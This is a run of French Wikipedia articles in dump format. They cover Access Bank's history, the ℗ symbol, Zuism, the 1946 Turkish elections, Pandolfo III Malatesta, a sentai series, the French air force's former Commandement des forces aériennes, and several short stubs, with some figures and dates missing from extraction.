En 2004, Access Bank fait l’acquisition de Capital Bank et Marina Bank via une fusion par absorption et intégration.
Durant l’année 2007, Access Bank devient la première banque nigériane à introduire et à commencer à utiliser les cartes de crédit Visa au Nigéria, à obtenir la certification EMV pour la plate-forme de services de guichets automatiques multicartes, et à recevoir un financement du Fonds belge des sociétés d'investissement pour les pays en développement.
En 2009, Access Bank opère une fusion avec l' (ICB) et fait son entrée la même année au LSE, la bourse de Londres. Un Eurobond de 350 millions de dollars est également levé avec succès.
Durant l'année 2018, Access Bank annonce son intention d'acquérir Diamond Bank pour 235 millions de dollars, qui représente un nouvel ensemble de 29 millions de clients. Elle annonce aussi une collaboration avec 25 banques mondiales pour développer les principes de la banque durable et aligner le secteur sur les objectifs de développement durable des Nations unies, et le lancement d'Access WhatsApp Banking. La finalisation de la fusion avec Diamond Bank est annoncée en mars 2019.
En mars 2021, Access Bank annonce l'acquisition d'une participation dans le capital de Grobank, une banque sud-africaine, pour 60 millions de dollars. Et l'acquisition d'une participation de 78 % dans le capital d', la 5 banque du Botswana.
Le 9 février 2024, Herbert Wigwe, directeur général d'Acces Bank, meurt dans un accident d'hélicoptère en Californie faisant six victimes dont sa femme et son fils.
En octobre 2024, l'organe régulateur de Namibie accorde une licence bancaire provisoire à Access Bank, ce qui marque une nouvelle étape dans son expansion africaine.
Expansion prévu en 2021.
En Afrique.
Au début de l'année 2021, Access Bank a annoncé qu’elle avait identifié huit nouveaux pays africains pour une potentielle expansion, cherchant à bénéficier d'un pacte de libre-échange à l'échelle continentale. Les marchés visés sont le Maroc, l'Algérie, l'Égypte, la Côte d'Ivoire, le Sénégal, l'Angola, la Namibie et l'Éthiopie, ce qui étendrait la présence internationale du groupe bancaire à 18 pays. Access Bank devrait établir des bureaux dans certains pays et dans d'autres, devrait nouer des partenariats avec les banques existantes et tirer parti de ses plateformes numériques pour fournir des services aux clients.
En France et en Europe.
En juillet 2021, le gouvernement français a indiqué qu'il souhaitait renforcer ses liens avec les capitaines d'industrie nigérians dont , le directeur général d’Access Bank, et a annoncé qu’un accord avait été signé qui allait permettre au groupe de s’installer en France. Cet accord confirme la vision et la volonté du groupe d'étendre son influence et ses activités à toute la France et progressivement à toute l'Europe.
L’ouverture d'Access Bank à Paris sera gérée par la succursale londonienne du groupe, dirigée par le Britannique Jamie Simmonds. Les nouveaux bureaux en France se concentreront sur les financements commerciaux. La banque nigériane envisage également de se lancer dans les services d'investissement et de gestion de patrimoine.

</doc>
<doc id="9624931" url="https://fr.wikipedia.org/wiki?curid=9624931" title="Symbole de copyright phonographique">
Symbole de copyright phonographique

Le symbole de copyright phonographique, ℗ (la lettre capitale P dans un cercle), est utilisé pour représenter la présence d'un copyright sur un enregistrement sonore (phonogramme). L'usage de ce symbole a vu le jour dans la législation sur le droit d'auteur aux États-Unis et a été par la suite spécifié internationalement par la Convention pour la protection des producteurs de phonogrammes contre la reproduction non autorisée de leurs phonogrammes.
Spécificité.
Un enregistrement sonore dispose d'un copyright différent de celui de l’œuvre (généralement musicale, sous la forme d'une partition musicale et de paroles) dont il est l'interprétation. Le copyright phonographique ne constitue une protection que pour l'enregistrement en lui-même, et ne s'appliquera pas aux autres interprétations de la même œuvre, qu'elle provienne ou non des mêmes artistes.
Utilisation.
La façon d'utiliser le symbole du copyright phonographique est spécifiée par l'article 5 de la Convention des phonogrammes de Genève.
Cet article spécifie que chaque copie de l’enregistrement distribuée au public doit porter la mention du copyright phonographique. 
Cette mention doit comporter :
Le symbole Unicode est . Il ne doit pas être confondu avec les caractères et .

</doc>
<doc id="9624932" url="https://fr.wikipedia.org/wiki?curid=9624932" title="Welcome Spring ! Festival">
Welcome Spring ! Festival

Le Welcome Spring ! Festival est un événement se déroulant à Louvain-la-Neuve, en Belgique, rassemblant près de et dont l'organisation s'inscrit dans un esprit qui se veut accessible à tous en combinant culture, divertissement et gratuité.
L'éclectisme du Welcome Spring ! Festival font de ce festival l’événement culturel et musical annuel .
Historique.
En 1988, une poignée d'étudiants issus des diverses facultés de l'Université catholique de Louvain décident de se regrouper pour promouvoir la culture musicale à Louvain-la-Neuve. Ils créent alors un kot-à-projet sous le nom de "Kot-é-Rythmes". Quelques années plus tard, les premières Fêtes de la musique de Louvain-la-Neuve sont organisées. Ce festival, totalement gratuit, se déroule dans le cadre de la Fête de la musique qui a lieu traditionnellement le dans tout le pays. 
Au fil des années, , . 
En 2004, les membres du "Kot-é-Rythmes" ont donc décidé de constituer une Association sans but lucratif. L'édition 2005 des Fêtes de la musique de Louvain-La Neuve a rassemblé plus de , devant 11 scènes dédiées à des styles musicaux variés. 
En 2007, et prennent un nouveau nom, le Welcome Spring ! Festival afin d’éviter toute confusion avec la Fête de la Musique organisée par la Communauté Française au mois de juin. 
Particularités.
Le festival est entièrement organisé par les membres d'un "kot-à-projet", composé de douze étudiants. Aux côtés de la population estudiantine, , un nombre de résidents participe à cet évènement à la fois culturel et convivial.
En effet, tout au long de la journée, de nombreuses activités telles que le village des enfants ainsi que le village des sports sont proposées aussi bien pour les enfants, les adultes que pour les étudiants. De plus, le grand nombre de rues piétonnes contribue à l'ambiance particulière du festival.
Le Kot-é-Rythmes.
En plus de l'organisation du Festival, les étudiants du Kot-é-Rythmes créent des capsules vidéos, plus connues sous le nom de « Welcome Street ». Celles-ci font partie d'un projet commun avec un autre kot-à-projet, le Photokot. Le but des « Welcome Street » est d'installer les artistes (amateurs ou professionnels) dans les plus beaux lieux de la ville de Louvain-la-Neuve pour des live acoustiques remarquables. 
Plusieurs Welcome Street ont déjà été produit : 
Lors des 24 heures vélo de Louvain-la-Neuve, le Kot-é-Rythmes organise un concours jeunes talents. Ce concours s'est mis en place afin de promouvoir nos jeunes talents belges en quête de reconnaissance artistique et musicale. Concrètement, quatre groupes sont sélectionnés (sur base d’une démo) et ont de se produire sur l (Grand Place) lors des 24h Vélo de Louvain-La-Neuve ! Ils sont ensuite jugés par un jury composé du monde musical et par un public . 

</doc>
<doc id="9624933" url="https://fr.wikipedia.org/wiki?curid=9624933" title="Maksim Gussev">
Maksim Gussev

Maksim Gussev, né le à Narva en Estonie, est un footballeur international estonien, qui évolue au poste de milieu offensif.
Biographie.
Carrière de joueur.
Maksim Gussev dispute deux matchs en Ligue Europa, pour un but inscrit.
Carrière internationale.
Maksim Gussev compte quatre sélections et un but avec l'équipe d'Estonie depuis 2015. 
Il est convoqué pour la première fois par le sélectionneur national Magnus Pehrsson pour un match amical contre la Finlande le (victoire 2-0). Par la suite, le , il inscrit son premier but en sélection contre la Géorgie, lors d'un match amical (victoire 3-0).

</doc>
<doc id="9624942" url="https://fr.wikipedia.org/wiki?curid=9624942" title="Zuisme">
Zuisme

Le zuisme ou zouisme (; ; symbole religieux: 𒀭), appelé aussi néopaganisme sumérien-mésopotamien (sumérien : ', « connaissance du ciel ») et néopaganisme sémitique-cananéen (ougaritique : ', « voie sacrée »), est un ensemble de mouvements néo-païens de tradition sumérienne-mésopotamienne et sémite-cananéenne. Il existe des groupes zuistes aux États-Unis, en Europe de l'Ouest, en Europe de l'Est et au Moyen-Orient.
Ses origines se situent chez les néo-païens hongrois des années 1960 et 1970, notamment dans l'œuvre de l'assyriologue Ferenc Badiny Jós (1909–2007), qui fonde une Église zuiste hongroise et était l'auteur de la "Bible magyare". Le néopaganisme mésopotamien est aussi cultivé par l'auteur ésotérique américain Joshua Free, qui rend publiques ses doctrines depuis 2008 sous le nom de « zuisme mardukite ».
En Islande, une organisation zuiste locale, la "", officiellement reconnue par l'État en 2013, a été utilisée pour contourner la taxe religieuse et protester contre les liens entre la religion et l'État.
Étymologie.
Le mot « zuisme » vient du verbe sumérien "zu" 𒍪 ("idû" en akkadien), qui signifie « savoir », « connaître ». « Zuisme » signifie donc « voie de la connaissance », et le mot a été utilisé pour la première fois par l'ésotériste américain Joshua Free au milieu des années 2000. Le terme est un parallèle sémantique du grec "gnosis".
Le mouvement est également connu sous le noms de « kaldanisme », c'est-à-dire « voie de Chaldée » (un nom tardif pour Sumer), de « reconstructionnisme sumérien-mésopotamien/sémitique-cananéen », de "anunna-umun" 𒀭𒀀𒉣𒈾𒌣, c'est-à-dire « connaissance du ciel » en sumérien, ou de "ntb qdš" ["natib qadish"] 𐎐𐎚𐎁𐎟𐎖𐎄𐎌, c'est-à-dire « voie sacrée » en ougaritique, langue de la cité-État antique cananéenne d'Ougarit.
Types de zuisme.
Zuisme hongrois.
Le premier mouvement zuiste organisé a été lancé par l'assyriologue hongrois Ferenc Badiny Jós (1909–2007), mais aussi par l'historienne Ida Bobula (1900–1981) et d'autres auteurs, tels que Tibor Baráth, Victor Padányi et András Zakar, dans les années 1960 et 1970, parmi les néo-païens en Hongrie qui cherchaient à relier les origines des Hongrois aux anciens Sumériens; les langues hongroises et sumériennes partageant certaines caractéristiques communes comme l'agglutination.
Ferenc Badiny Jós, émigré à Buenos Aires, en Argentine, fonda une « Église hongroise » () de tradition sumérienne, dont l'héritage se prolonge encore aujourd'hui parmi les zuistes (néo-païens sumériens) en Hongrie. Un héritage important de Badiny Jós est sa "Bible magyare" de tradition sumérienne.
Zuisme mardukite.
Le zuisme mardukite () est une doctrine du zuisme fondée par l'ésotériste américain Joshua Free en 2008 et incorporée par l'« Église fondatrice du zuisme mardukite » (). Le zuisme mardukite renvoie à la tradition akkadienne assyro-babylonienne ultérieure, plutôt qu'à la tradition sumérienne plus ancienne.
Leurs livres religieux comprennent la "Bible Anunnaki" et d'autres livres de la collection « nouvelle édition zuiste standard » (), "The Power of Zu", le "Necronomicon" zuiste, et les nombreux autres écrits de théorie et de pratique du même auteur. Joshua Free définit le Zuisme comme une « systémologie » et une « technologie spirituelle » pour la réalisation de soi, c'est-à-dire la réunion de soi avec Dieu, et, en plus de « connaissance », donne à "zu" le sens de « conscience » et l'interprète comme l'énergie rayonnante qui imprègne tous les êtres vivants.
Zuisme irakien.
L'assyriologue russe V. V. Yemelyanov a documenté la montée d'un néopaganisme zuiste en Irak au début des années 2010, avec la diffusion de prières aux dieux mésopotamiens en langue arabe.
Zuisme cananéen.
Le zuisme reconstructionniste cananéen est une petite communauté dans l'Israël contemporain. Il a des antécédents dans le mouvement culturel et littéraire du cananisme chez les Juifs de Palestine britannique dans les années 1940, en particulier dans l'œuvre de Yonatan Ratosh (1908–1981), né sous le nom d'Uriel Helpern à Varsovie, en Pologne.
L'adhérent israélien Elad Aaron a formulé une idéologie culturelle pour la redécouverte politique de la religion pandeiste cananéenne appelée le « nouveau cananisme re-sioniste » (). Le zuisme cananéen est également appelé "natib qadish", une expression en ougaritique créée par l'adhérente américaine Tess Dawson au début des années 2000. Les adeptes de cette dernière dénomination sont appelés les "qadish", au pluriel "qadishuma", et les prêtres, hommes et femmes, sont appelés respectivement "kahin" et "kahinat".
Zuisme islandais.
L'« Association de foi du zuisme » () a été fondée en Islande en 2010 par Ólafur Helgi Þorgrímsson, à l'origine comme branche d'une église mère située dans l'État du Delaware, aux États-Unis, et enregistrée par l'État islandais en 2013. En Islande, tout citoyen doit payer annuellement une taxe religieuse, la "", qu'il soit croyant ou non. Certaines personnes désapprouvant ce système, guidées par Ísak Andri Ólafsson, ont pris le contrôle de l'organisation en 2015 dans un but de résistance fiscale : la part de la taxe religieuse reversée au mouvement par le gouvernement est alors redistribuée à chacun des adeptes, qui trouvent ainsi un moyen de s'affranchir de cet impôt.
La "Zuism trúfélag" de Ísak Andri Ólafsson entend ainsi lutter contre la levée d'une taxe religieuse en Islande ainsi que la tenue d'un registre national de la religion des Islandais. Cette protestation s'inscrit dans un mouvement plus large demandant la séparation de l'Église et de l'État, à tel point que même certains politiciens bien connus ont rejoint le mouvement, comme Birgitta Jónsdóttir. La "Zuism trúfélag" ayant été utilisée pour des motifs fiscaux clairement affichés et non pour des motifs religieux, des élus islandais ont demandé son retrait du registre officiel des religions reconnues en Islande. Un porte-parole de la "Zuism trúfélag" répond néanmoins à cette demande que l'on ne peut définir précisément la nature religieuse d'une organisation et que l'on ne peut mesurer la sincérité de la croyance religieuse&lt;ref name="20minutes 08/12/15"&gt;.&lt;/ref&gt;.
Au , la religion ne compte que 4 adeptes déclarés, mais leur nombre croît très rapidement durant quelques semaines fin 2015 au point d'atteindre à adeptes, soit 1 % de la population islandaise en 2015–2016. La majorité d'entre eux sont jeunes, connectés à Internet et déjà désaffiliés du christianisme.

</doc>
<doc id="9624943" url="https://fr.wikipedia.org/wiki?curid=9624943" title="Élections législatives turques de 1946">
Élections législatives turques de 1946

Les élections législatives turques de 1946 sont les premières élections libres en Turquie depuis l'avènement du kémalisme.
Contexte.
La fin de la Seconde Guerre mondiale en Europe coïncide avec l'avènement du multipartisme en Turquie. Ainsi le président de la Turquie de l'époque, İsmet İnönü déclarait le 19 mai 1945 : .
Déroulement.
Ces élections, bien qu'étant les premières élections libres depuis l'avènement du kémalisme sont encore largement surveillées par l'État. Elles se déroulent à scrutin non secret. Des pressions politiques sont exercées sur les partis d’opposition au CHP et des membres des forces de sécurité tentent dans plusieurs bureaux de vote d’empêcher les électeurs de voter.
Elles se déroulent au scrutin majoritaire à un tour visant à renouveler les du parlement turc.
Le gouvernement a précipité la date des élections avant que les partis d'opposition n'aient pu achever leur organisation politique. Le principal parti d'opposition, le Parti démocrate, ne présente par exemple que dans l’ensemble les circonscriptions du pays.

</doc>
<doc id="9624947" url="https://fr.wikipedia.org/wiki?curid=9624947" title="Zouisme">
Zouisme



</doc>
<doc id="9624948" url="https://fr.wikipedia.org/wiki?curid=9624948" title="Comarque métropolitaine de Jaén">
Comarque métropolitaine de Jaén

La Comarque Métropolitaine de Jaén est une comarque d'Espagne située dans la province de Jaén dans la communauté autonome d'Andalousie.
Elle occupe une surface pour une population de 226.099 habitants (selon les données de l'INE pour 2008), soit une densité de population de 128,57 hab/km.
Géographie.
La comarque est située à l'ouest de la province.
Elle est frontalière avec :
Communes.
La comarque était composée traditionnellement par six communes : Fuerte del Rey, La Guardia de Jaén, Jaén, Mancha Real, Torredelcampo et Villatorres.
Depuis le , la comarque a intégré des communes de comarques limitrophes.
La comarque intègre maintenant les 16 communes suivantes :

</doc>
<doc id="9624950" url="https://fr.wikipedia.org/wiki?curid=9624950" title="Pandolfo III Malatesta">
Pandolfo III Malatesta

Pandolfo III Malatesta dit « il Grande » (le Grand), né à Fano le et mort dans cette même ville le est un condottiere italien. Seigneur de Fano, Brescia et Bergame. Il était un membre de la puissante maison de Malatesta.
Biographie.
Pandolfo III Malatesta est le frère de Carlo I et Andrea Malatesta, avec lesquels il combattit à plusieurs reprises.
Pandolfo III Malatesta est le deuxième fils de Galeotto I Malatesta. Après la mort de ce dernier, les terres Malatesta sont partagées: il reçoit Fano, tandis que ses frères Carlo, Andrea et Galeotto Novello héritent respectivement de Rimini, Cesena et Cervia. Tous les fils de Galeotto ont été instruits en vertu de doctrines humanistes de Giacomo Allegretti et Francesco Filelfo.
Pandolfo a commencé sa carrière comme condottiere à l'âge de 18 ans, leader d'une bande de "masnadieri" ravageant la Toscane. En 1388, il a accepté une " condotta" de Venise contre le Carraresi famille de Padoue.
En 1393, il combat avec son frère Andrea les Ordelaffi de Forlì, mais son occupation de Todi et Narni, faisant alors partie des États pontificaux, lui a attiré l'excommunication par pape Boniface IX. Gracié, il a combat les Visconti de Milan dans une ligue soutenant François de Mantoue.
Pandolfo part ensuite en croisade dans la Terre Sainte et est de retour en 1402. Engagé par Gian Galeazzo Visconti avec son frère Andrea, il participe à la bataille de Casalecchio contre Bologne et est nommé gouverneur de cette ville.
Après la mort de Gian Galeazzo il est conseiller de sa veuve Caterina et profite de cette position, ainsi que d'autres "condotte" pour les Etats italiens, pour agrandir sa petite seigneurie et piller les États voisins et des villes comme Trezzo et Côme (1403), Brescia (1404), qu'il a reçues des Visconti comme paiement de son crédit de Ducats et Bergame (1407).
En 1413, il est nommé "Capitano generale" (commandant en chef) des armées vénitiennes, et combat le roi Sigismond de Luxembourg.
Une victoire à Udine et une habile retraite lui rapportent un palais à Venise, et le titre de "duc de Crète", qu'il refuse. Cependant, ses territoires en Lombardie sont attaqués par Francesco Bussone, nouveau condottiere du duc Filippo Maria Visconti. Pandolfo perd Bergame et Brescia en 1421.
En 1424, au cours de la Première Guerre en Lombardie, l'armée florentine dirigée par les frères Malatesta (avec 10.000 cavalerie et 3000 fantassins) est battue à la bataille de Zagonara. Carlo est capturé et Pandolfo fuit à Cesena avec quelques hommes d'armes. Il perd Imola et Faenza au profit des Visconti, mais réussit à garder Fano grâce à l'intercession du Pape Martin V.
Au cours des années suivantes Pandolfo III se consacre aux études humanistes et à l'embellissement de sa ville.
Pandolfo III Malatesta est mort en 1427 à Fano où il est enterré dans l'église de Saint-François. Son tombeau a été construit par son fils illégitime, Sigismondo Malatesta. Son autre fils Domenico a été seigneur de Cesena de 1429 à 1456.

</doc>
<doc id="9624951" url="https://fr.wikipedia.org/wiki?curid=9624951" title="CAPTV">
CAPTV



</doc>
<doc id="9624954" url="https://fr.wikipedia.org/wiki?curid=9624954" title="Dōbutsu Sentai Zyuohger">
Dōbutsu Sentai Zyuohger

 est une série télévisée japonaise du genre "sentai" créée en 2016.
Il s'agit de la de la franchise. Cette série fête le 40e anniversaire des Super Sentais ainsi que le 2000e épisode de la saga depuis ses débuts (épisode n°29) avec comme invités les Kaizoku Sentai Gokaiger. Les Dobutsu Sentai Zyohger apprennent l'existence des Super Sentais car ils n'avaient aucune connaissance à ce sujet avant l'épisode 29.
Synopsis.
Yamato Kazakiri, un jeune zoologue, se retrouve perdu sur Zyuland, un monde parallèle situé sur Terre où vivent les Zyuman, des êtres à l'apparence animale.
Dans le même temps, le monde des humains est attaqué par de méchants extra-terrestres, les Deathgaliens, dirigés par Ginis depuis son vaisseau, Sagittari Ark. Cette attaque fait partie d'un jeu, le Blood Game où les Deathgaliens doivent détruire une planète dans le seul but de distraire Ginis.
Yamato et les Zyumans ne peuvent pardonner cet acte aux Deathgaliens. En tant qu'êtres fiers vivant sur la Terre, ces cinq personnes réveillent leurs instincts et deviennent les Dōbutsu Sentai Zyuohger ! Avec les Cubes du Monarque en main, humains et Zyumans se rassemblent pour protéger leur foyer.
Personnages.
Anciens Super Sentai.
On notera également que tous les Super Sentai et chacun de leur membres (Kyuranger compris) apparaissent en tant que caméo dans le film .
Hors-la-loi de l'espace Deathgalien.
Les sont un groupe de malfaiteurs ayant attaqué Zyuland. Ils opèrent depuis .
Ganma.
Les Ganma sont les ennemis des Kamen Rider Ghost et Necrom et ils viennent du monde Ganma, ils sont aussi invisibles. Seuls ceux qui possèdent une Ghost Eyecons peuvent les voir.
Shocker.
Shocker est une organisation maléfique qui transforme des gens qui possèdent de grande capacité en monstres. Ils sont les ennemis de Kamen Rider Ichigo.
Mechas.
À noter que Cube Shark peut être remplacé par Cube Tiger et que Cube Lion peut être remplacé par Cube Elephant.

</doc>
<doc id="9624966" url="https://fr.wikipedia.org/wiki?curid=9624966" title="Flacé">
Flacé

Flacé est le nom de deux anciennes communes françaises :

</doc>
<doc id="9624971" url="https://fr.wikipedia.org/wiki?curid=9624971" title="Birot">
Birot

Patronyme.
patronyme composé
personnalités

</doc>
<doc id="9624975" url="https://fr.wikipedia.org/wiki?curid=9624975" title="Leo Shuken">
Leo Shuken

Leo Shuken est un compositeur de musique de film, un arrangeur et un orchestrateur américain né le à Los Angeles (Californie) et mort le à Los Angeles.
Biographie.
Leo Shuken a travaillé sur plusieurs centaines de film, notamment comme orchestrateur ou arrangeur, souvent en collaboration avec .

</doc>
<doc id="9624988" url="https://fr.wikipedia.org/wiki?curid=9624988" title="Bae Bien-u">
Bae Bien-u

Bae Bien-u (né le à Yeosu, Corée du Sud) est un photographe coréen représenté par la Galerie RX.
Biographie.
Formé à la peinture traditionnelle puis au design, Bae Bien-u artiste sud-coréen a appris la photographie en autodidacte.
Opposé à toute retouche de ses images, il a longtemps utilisé la chambre noire et continue aujourd’hui à travailler à l’argentique,
Ses œuvres au langage universel reflètent avant tout la préoccupation du peuple coréen à vivre en harmonie avec la nature. Photographie panoramique d’une nature en perpétuel mouvement. Sa série emblématique sur les arbres sacrés encourage l’esprit du spectateur à prendre le temps de s’évader et méditer dans ce paysage. 
Cette vision horizontale suscite une forme de puissance, de profondeur que renforce le format panoramique utilisé par l’artiste, dans lequel la tension est construite par des effets de contraste marqués et des lignes très prégnantes qui structurent l’espace.

</doc>
<doc id="9624990" url="https://fr.wikipedia.org/wiki?curid=9624990" title="Quand tu serres mon corps">
Quand tu serres mon corps

Quand tu serres mon corps est le titre d'une chanson interprétée par le groupe Pacifique sortie en 1989. Cette ballade est certifiée disque d'or.

</doc>
<doc id="9624991" url="https://fr.wikipedia.org/wiki?curid=9624991" title="Université Paris-II">
Université Paris-II



</doc>
<doc id="9624992" url="https://fr.wikipedia.org/wiki?curid=9624992" title="Abraham Bertuis">
Abraham Bertuis



</doc>
<doc id="9625002" url="https://fr.wikipedia.org/wiki?curid=9625002" title="Patrick Gomdaogo Ilboudo">
Patrick Gomdaogo Ilboudo



</doc>
<doc id="9625015" url="https://fr.wikipedia.org/wiki?curid=9625015" title="Stephen A. Rotter">
Stephen A. Rotter

Stephen A. Rotter est un monteur américain. Il a travaillé sur environ 30 films.
Il a remporté, avec Glenn Farr, Lisa Fruchtman, Tom Rolf et Douglas Stewart, l'Oscar du meilleur montage lors de la des Oscars pour "L'Étoffe des héros".
Rotter a également remporté un prix "Emmy", partagé avec Alan Heim, Craig McKay, Robert M. Reitano et Brian Smedley-Aston, pour la mini-série "Holocauste".

</doc>
<doc id="9625018" url="https://fr.wikipedia.org/wiki?curid=9625018" title="François-César de Chabrillan">
François-César de Chabrillan



</doc>
<doc id="9625028" url="https://fr.wikipedia.org/wiki?curid=9625028" title="Vecmīlgrāvis">
Vecmīlgrāvis

Vecmīlgrāvis est un voisinage () dans l'arrondissement du Nord de Riga.
Géographie.
Situé sur la rive droite du fleuve Daugava à l'endroit où il se jette dans le Golfe de Riga. 
Ses frontières sont délimitées par la ligne de chemin de fer qui part depuis la rue Atlantijas jusqu'à la perspective Vecāķu ("Vecāķu prospekts"), puis, par les rues "Laivinieku iela" et "Jaunciema iela", par les rives du Daugava et de l'Audupe. 
Ce territoire borde les voisinages de Vecdaugava et Trīsciems, il est relié par le pont avec Mīlgrāvis, alors que le long des rives du fleuve Daugava il correspond avec le Sarkandaugava, Kundziņsala, Voleri, Bolderāja, Daugavgrīva et Mangaļsala. 
Avec sa superficie de il est un peu au-dessus de la moyenne des voisinages de la capitale. Sa partie nord-est qui correspond à l'ancienne zone portuaire est appelée Rīnūži. On distingue aussi son centre Ziemeļblāzma .

</doc>
<doc id="9625033" url="https://fr.wikipedia.org/wiki?curid=9625033" title="Commandement des forces aériennes">
Commandement des forces aériennes

Le Commandement des forces aériennes (CFA) est l'un des quatre grands commandements de l'Armée de l'air et de l'espace française.
Le 4 juillet 2023, le Commandement des forces aériennes (CFA) a fait ses adieux sur la base aérienne 106 de Bordeaux-Mérignac. Fruit de la réorganisation de l'AAE, le Commandement territorial de l'Armée de l'air et de l'espace (CTAAE) lui a succédé en septembre 2023. 
Présentation.
Le CFA est un commandement organique majeur de l'Armée de l'air et de l'espace, il est chargé de la préparation et du soutien opérationnel des forces conventionnelles, spéciales et d’appui. Ce commandement est organisé autour d’un état-major, de sept brigades métiers et d’un centre de permanence actif en permanence sur la base aérienne 106 de Bordeaux-Mérignac. C'est lui qui gère l'ensemble des ressources humaines et techniques permettant à l'armée française de disposer d'une force aérienne autonome en opération extérieure. Il regroupe ainsi et femmes répartis dans plus de en France et à l’étranger.
En raison de ses compétences, il intervient en relation avec de nombreuses autres composantes militaires telles que l'État-major des armées, l'État-major de l'Armée de l'air, le Commandement de la défense aérienne et des opérations aériennes (CDAOA), le commandement des Forces aériennes stratégiques (CFAS), la direction des ressources humaines (DRHAA), la SIMMAD, l'European Air Transport Command (EATC), bases aériennes, escadres, unités...
Il a été créé en 2014, par la fusion du commandement du soutien des Forces aériennes (CSFA, déjà situé à Mérignac) et du commandement des Forces aériennes (CFA, qui était basé à Dijon). Cette implantation en Nouvelle-Aquitaine permet aussi un rapprochement avec les entreprises du secteur aéronautique et spatial.
Organisation en brigades.
Brigade aérienne de l'aviation de chasse (BAAC).
La Brigade aérienne de l'aviation de chasse (BAAC), basée au sein de la caserne Blandan à Nancy, est responsable de la préparation et de la mise en condition opérationnelle des unités « chasse » de l’armée de l’Air et de l'Espace française. Elle a sous ses ordres une vingtaine d’unités équipées d’avions de chasse et de drones qui peuvent être engagées en permanence dans n'importe quelle région du monde.
D’une part, elles garantissent sans interruption la souveraineté de l’espace aérien français et la police du ciel sur le territoire national. D’autre part, dans le domaine de l’intervention immédiate, les unités de combat de la BAAC apportent d'importantes capacités d'intervention à la Défense nationale française :
Du côté de la formation et de l’entraînement, la BAAC procède à la spécialisation « chasse » des navigants. Elle est également chargée de la formation opérationnelle des équipages et des contrôleurs aériens avancés. Certaines de ces formations sont également dispensées au personnel des autres armées (notamment l'aviation de la marine nationale) et de nations alliées.
Enfin, elle rassemble plusieurs unités de « prestige » de l’armée de l’air : la Patrouille de France, l’équipe de voltige aérienne et le présentateur Rafale.
Brigade aérienne d'assaut et de projection (BAAP).
La projection de forces par voie aérienne est une capacité constitutive de l’armée de l’air nécessaire au succès des opérations militaires. Les unités navigantes de la BAAP stationnées en métropole, prépositionnées en outre-mer ou à l’étranger et engagées en opérations sont spécialisées dans ce domaine. Ainsi, elles assurent l’acheminement, l’engagement, l’appui, le soutien ainsi que le désengagement des forces armées françaises.
Elles participent à la manœuvre tactique en mettant en œuvre une flotte diversifiée d’avions stratégiques, tactiques, de liaison et d’hélicoptères. Par ailleurs, ses unités de transit et escales aériennes militaires contribuent à l'organisation logistique militaire par le traitement du fret, la gestion des passagers et l’accueil des aéronefs et de leurs équipages. En 2018, l’objectif pour 2030 est qu'elle soit en mesure de transporter et chaque semaine.
Engagées au profit des forces spéciales, des services spécialisés et sur tous les théâtres d’opérations, les unités de la BAAP réalisent également des missions particulières dont la recherche et le sauvetage au combat, les évacuations aérosanitaires, l’appui feu de troupes au sol, les mesures actives de sûreté aérienne dans le cadre de la posture permanente de sûreté aérienne (PPS), le transport des hautes autorités gouvernementales ainsi que des missions de service public au profit des populations.
La BAAP pilote la formation au sein de ses centres d’instruction et la préparation opérationnelle de ses unités permettant de mener leurs missions et de pourvoir aux besoins des opérations. Sa devise est « Combattre et Sauver ».
Brigade aérienne des systèmes d'armes et de la logistique (BASAL).
La BASAL assure la mise en œuvre, le maintien et la mise en condition opérationnelle des moyens du niveau du soutien technique et logistique opérationnel. Elle est garante de l’optimisation des ressources humaines, matérielles et logistiques pour répondre aux besoins de l’activité aérienne sur les bases et détachements air, en France comme à l’étranger.
Concrètement, des escadrons de soutien technique aéronautique sont chargés de la mise en œuvre opérationnelle et de la maintenance des systèmes d’armes conventionnels de l’armée de l’air, c'est-à-dire des (avions de chasse, de transport, hélicoptères, drones...), des armements et des équipements qui y sont associés. Les autres unités technico-opérationnelles rattachées à la BASAL sont chargées de la fonction logistique aéronautique (ravitaillement, stockage, distribution ou transport), des matériels d’environnement aéronautique et de la formation spécialisée. Elle dispose aussi d'unités aux missions très spécifiques comme les groupes d’intervention de neutralisation, enlèvement et destruction d’explosif ou les équipes techniques expertes en contrôles non destructifs et en réparations.
En tout, la BASAL compte près d’une centaine d’unités, réunissant plus de . Un millier de militaires des services techniques d’unités navigantes et sol-air sont également sous sa tutelle.
Brigade aérienne d’appui à la manœuvre aérienne (BAAMA).
La BAAMA a pour mission de gérer l’ensemble des systèmes d’information et de communication (SIC) et des infrastructures de l'Armée de l'air.
Cette brigade regroupe ainsi l’ensemble des métiers qui participent au déploiement, à la mise en œuvre et au maintien en condition des systèmes de surveillance, d’information et de communication ainsi que des installations aéronautiques, en stationnement comme en projection. La brigade appuie également l’état-major de l’armée de l’air pour identifier et répondre aux besoins des forces dans ces domaines et notamment l’adaptation des infrastructures des bases destinées à accueillir les nouveaux systèmes d’armes (A400M, MRTT, Rafale, SCCOA).
Côté unités, les escadrons des SIC aéronautiques et les centres radios sol-air apportent un soutien permanent au profit des forces stationnées. Six unités d’appui au déploiement conçoivent et déploient les infrastructures et l’environnement SIC indispensables à l’action aérienne : le du génie de l'air, l'escadre aérienne d'appui aux opérations, le groupement aérien des installations aéronautiques et trois escadrons de l’escadre aérienne de commandement et de conduite projetable.
Des équipes techniques ou centres spécialisés détiennent l’expertise sur ces équipements et assurent la formation du personnel. Enfin, le groupement aérien de l’informatique opérationnelle est expert dans le domaine de la Cyberdéfense.
Brigade aérienne du contrôle de l’Espace (BACE).
La BACE participe au contrôle aérien et à la défense sol-air. Elle contribue ainsi au dispositif global de la défense aérienne. Ses 44 unités exercent leurs missions principalement dans les domaines du contrôle aérien, de la guerre électronique et de la défense sol-air.
Parmi ces unités, deux centres sont destinés à la formation des contrôleurs aériens et des opérateurs des systèmes sol-air. Dans le domaine du sol-air, quatre escadrons de défense sol-air assurent la protection des sites sensibles et des forces déployées contre toutes les menaces classiques ou balistiques. Ils mettent en œuvre les différents systèmes de missiles Crotale et Aster 30 (SAMP/T Mamba).
Dans le domaine du contrôle, les escadrons des services de la circulation aérienne fournissent les services de contrôle local, de la météorologie et la protection contre le péril animalier sur les plates-formes de l’armée de l’air. Les centres de détection et de contrôle surveillent l’espace aérien national, assurent le contrôle de la police du ciel et contribuent à l’entraînement des forces aériennes. Les centres militaires de coordination et de contrôle sont chargés du contrôle en route des aéronefs militaires. L’escadron de détection et de contrôle mobile assure des missions de contrôle tactique sur le territoire national ou en opérations. Enfin, la escadre de commandement et de conduite aéroportée est équipé de quatre avions radars AWACS E-3F, essentiels pour des missions de type surveillance ou commandement et conduite des opérations aériennes sur, à partir ou hors du territoire français.
Brigade des forces spéciales air (BFSA).
